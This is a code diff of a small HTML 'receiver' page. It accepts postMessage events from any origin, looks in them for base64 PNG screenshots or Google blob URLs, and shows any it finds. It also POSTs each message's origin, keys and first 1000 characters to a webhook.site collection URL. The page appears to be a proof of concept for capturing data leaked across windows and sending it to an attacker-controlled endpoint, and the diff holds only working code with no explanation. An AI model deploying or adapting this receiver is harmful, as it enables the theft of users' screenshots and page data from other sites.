@@ -1,38 +1,56 @@
-<script>
-  function deepFindScreenshot(obj) {
-    const str = JSON.stringify(obj);
-    const match = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
-    return match ? match[0] : null;
-  }
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Receiver Loaded</h1>
+    <script>
+      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace if needed
 
-  window.addEventListener("message", (e) => {
-    const origin = e.origin;
-    const screenshot = deepFindScreenshot(e.data);
-    const keys = Object.keys(e.data || {});
+      // Try to find either a base64 or blob screenshot reference
+      function deepFindScreenshot(obj) {
+        const str = JSON.stringify(obj);
+        const base64 = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
+        const blob = str.match(/blob:https:\/\/www\.google\.com\/[a-z0-9-]+/i);
+        return base64 ? base64[0] : blob ? blob[0] : null;
+      }
 
-    console.log("📥 Message received from", origin);
-    console.log("🔑 Keys:", keys);
-    console.log("🖼️ Screenshot embedded?", !!screenshot);
+      window.addEventListener("message", (e) => {
+        try {
+          const origin = e.origin;
+          const data = e.data;
+          const keys = Object.keys(data || {});
+          const screenshot = deepFindScreenshot(data);
 
-    if (screenshot) {
-      const img = document.createElement("img");
-      img.src = screenshot;
-      img.style = "max-width:100%;border:2px solid red;";
-      document.body.appendChild(img);
-    }
+          console.log("📩 Message received from:", origin);
+          console.log("🧩 Keys:", keys);
+          console.log("🖼 Screenshot found:", !!screenshot, screenshot);
 
-    fetch("https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322", {
-      method: "POST",
-      mode: "no-cors",
-      body: JSON.stringify({
-        origin,
-        keys,
-        containsScreenshot: !!screenshot,
-        truncated: JSON.stringify(e.data).slice(0, 1000),
-        timestamp: new Date().toISOString()
-      })
-    });
-  });
+          // If screenshot found, attempt to display it
+          if (screenshot) {
+            const img = document.createElement("img");
+            img.src = screenshot;
+            img.style = "max-width:100%;border:2px solid red";
+            document.body.appendChild(img);
+          }
 
-  console.log("✅ Receiver ready");
-</script>
+          // Always send to webhook
+          fetch(webhookURL, {
+            method: "POST",
+            mode: "no-cors",
+            body: JSON.stringify({
+              origin,
+              keys,
+              containsScreenshot: !!screenshot,
+              truncated: JSON.stringify(data).slice(0, 1000),
+              timestamp: new Date().toISOString()
+            })
+          });
+
+        } catch (err) {
+          console.error("Error handling postMessage:", err);
+        }
+      });
+
+      console.log("✅ Receiver ready");
+    </script>
+  </body>
+</html>
